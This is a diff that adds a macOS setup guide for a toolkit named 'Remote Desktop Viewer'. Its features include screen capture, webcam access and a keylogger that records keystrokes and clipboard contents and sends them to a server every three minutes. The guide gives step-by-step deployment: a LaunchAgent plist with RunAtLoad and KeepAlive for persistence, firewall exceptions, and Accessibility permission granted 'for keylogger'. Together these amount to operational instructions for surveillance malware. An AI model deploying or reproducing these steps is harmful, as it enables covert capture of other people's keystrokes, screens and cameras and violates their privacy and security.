@@ -1,0 +1,220 @@
+================================================================================
+                     REMOTE DESKTOP VIEWER - MACOS SETUP
+================================================================================
+
+REQUIREMENTS:
+- macOS 10.14 (Mojave) or higher
+- Python 3.8+
+- Screen recording permission
+
+================================================================================
+INSTALLATION
+================================================================================
+
+1. Install Python
+   # Using Homebrew (recommended)
+   brew install python3
+
+   # Or download from https://www.python.org/downloads/
+
+2. Install Python Packages
+   cd /path/to/toolkit
+   pip3 install -r requirements.txt
+
+3. Generate Certificates (First time only)
+   python3 certs/generate_certs.py
+
+4. Verify Installation
+   python3 verify_installation.py
+
+5. Grant Permissions
+   System Preferences → Security & Privacy → Privacy
+   - Screen Recording: Add Terminal/Python
+   - Accessibility: Add Terminal/Python (for keylogger)
+
+================================================================================
+RUNNING THE APPLICATION
+================================================================================
+
+METHOD 1: Direct Run (Testing)
+-------------------------------
+Terminal 1 (Server):
+   python3 server/server.py --web --web-port 5000
+
+Terminal 2 (Client):
+   python3 client/client.py --server-host 127.0.0.1 --server-port 8443
+
+Web Interface:
+   Open browser: http://localhost:5000
+
+METHOD 2: Two Machines
+----------------------
+Server Machine:
+   1. Find IP: ifconfig (look for inet, e.g., 192.168.1.100)
+   2. Run: python3 server/server.py --web --web-port 5000
+
+Client Machine:
+   python3 client/client.py --server-host 192.168.1.100 --server-port 8443
+
+METHOD 3: Build Executables
+----------------------------
+   chmod +x build_macos.sh
+   ./build_macos.sh
+
+   Output: dist/client and dist/server
+
+METHOD 4: LaunchAgent Service
+------------------------------
+   1. Create plist file:
+      nano ~/Library/LaunchAgents/com.rdv.client.plist
+
+   2. Add content:
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+        "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+      <plist version="1.0">
+      <dict>
+        <key>Label</key>
+        <string>com.rdv.client</string>
+        <key>ProgramArguments</key>
+        <array>
+          <string>/usr/local/bin/python3</string>
+          <string>/path/to/toolkit/client/client.py</string>
+          <string>--server-host</string>
+          <string>192.168.1.100</string>
+          <string>--server-port</string>
+          <string>8443</string>
+        </array>
+        <key>RunAtLoad</key>
+        <true/>
+        <key>KeepAlive</key>
+        <true/>
+      </dict>
+      </plist>
+
+   3. Load service:
+      launchctl load ~/Library/LaunchAgents/com.rdv.client.plist
+
+   4. Check status:
+      launchctl list | grep rdv
+
+   5. Unload service:
+      launchctl unload ~/Library/LaunchAgents/com.rdv.client.plist
+
+================================================================================
+FEATURES
+================================================================================
+
+Screen Capture:
+- Captures all monitors at 10 FPS
+- Displays at 20 FPS on server
+- SSL/TLS encrypted
+- Requires Screen Recording permission
+
+Keylogging:
+- Saves to: keylogs/[ClientName]/[ClientName]_DD.MM.YYYY_HH.MM.SS.txt
+- Captures clipboard on Ctrl+C/V
+- Counts consecutive keys: [BackSpace - 10]
+- Auto-sends every 3 minutes
+- Requires Accessibility permission
+- Format example:
+  aaaa SSSS DDDDD [CapsLock - 8]
+  [Enter]
+  {clipboard} copied text here
+
+Webcam:
+- Click "Webcam" button in web interface
+- Shows error if no webcam available
+
+Client Control:
+- Disable client: Check "Disable" box
+- Buttons become inactive when disabled
+
+================================================================================
+CONFIGURATION
+================================================================================
+
+Edit config.py to change:
+- CAPTURE_FPS = 10          # Screen capture rate
+- SCREEN_QUALITY = 80       # JPEG quality (1-100)
+- DEFAULT_SERVER_PORT = 8443
+- KEYLOG_ENABLED = True
+
+================================================================================
+FIREWALL SETUP
+================================================================================
+
+Allow incoming connections:
+   System Preferences → Security & Privacy → Firewall
+   - Click lock to make changes
+   - Firewall Options
+   - Add Python to allowed apps
+
+Or use command line:
+   sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /usr/local/bin/python3
+   sudo /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp /usr/local/bin/python3
+
+================================================================================
+PERMISSIONS
+================================================================================
+
+Screen Recording:
+   System Preferences → Security & Privacy → Privacy → Screen Recording
+   - Add Terminal or Python
+   - Restart application after granting
+
+Accessibility (for keylogger):
+   System Preferences → Security & Privacy → Privacy → Accessibility
+   - Add Terminal or Python
+   - Restart application after granting
+
+Camera (for webcam):
+   System Preferences → Security & Privacy → Privacy → Camera
+   - Add Terminal or Python
+
+================================================================================
+TROUBLESHOOTING
+================================================================================
+
+"python3: command not found":
+   brew install python3
+
+"Permission denied" for screen capture:
+   - Grant Screen Recording permission
+   - System Preferences → Security & Privacy → Privacy
+   - Restart Terminal
+
+Connection fails:
+   - Check firewall settings
+   - Verify server IP: ping 192.168.1.100
+   - Ensure server is running
+
+Keylogger not working:
+   - Grant Accessibility permission
+   - System Preferences → Security & Privacy → Privacy → Accessibility
+   - Restart application
+
+High CPU usage:
+   - Edit config.py: CAPTURE_FPS = 5
+   - Edit config.py: SCREEN_QUALITY = 60
+
+LaunchAgent not starting:
+   - Check plist syntax: plutil ~/Library/LaunchAgents/com.rdv.client.plist
+   - View logs: log show --predicate 'process == "python3"' --last 1h
+
+================================================================================
+FILE LOCATIONS
+================================================================================
+
+Keylogs:     keylogs/[ClientName]/*.txt
+Config:      config.py
+Certs:       certs/*.crt, certs/*.key
+Executables: dist/client, dist/server
+LaunchAgent: ~/Library/LaunchAgents/com.rdv.client.plist
+
+================================================================================
+SUPPORT
+================================================================================
+
+Check installation: python3 verify_installation.py
+View logs: log show --predicate 'process == "python3"' --last 1h
